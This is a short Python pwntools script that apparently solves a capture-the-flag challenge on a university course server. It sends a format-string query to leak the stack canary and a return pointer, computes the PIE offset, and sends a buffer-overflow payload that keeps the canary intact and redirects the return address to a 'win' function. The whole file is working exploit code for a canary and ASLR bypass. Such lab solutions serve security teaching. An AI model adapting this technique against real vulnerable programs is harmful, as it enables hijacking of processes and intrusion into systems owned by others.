from pwn import remote
import time

p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5003)

query = "%11$p%13$p"

p.clean()
p.sendline(query.encode())
resp = p.clean().decode()

v = resp[resp.index("Welcome, ")+9:].split("0x")[1:]
canary, ret_ptr = [int(i.rstrip(), 16) for i in v]
print("Canary:", hex(canary), "Return Pointer:", hex(ret_ptr))

orig = 0x555555555535

offs = ret_ptr-orig
print("offset:", hex(offs))
 
win = 0x5555555552bc
address = (win + offs).to_bytes(8, "little")
print("address:", address)

padding1 = ("A"*(4*14)).encode("ascii")
padding2 = ("A"*(4*2)).encode("ascii")

payload = padding1 + canary.to_bytes(8, "little") + padding2 + address

time.sleep(2)
p.sendline("2".encode())
p.sendline(payload)

time.sleep(2)
resp = p.clean().decode()
print(resp)
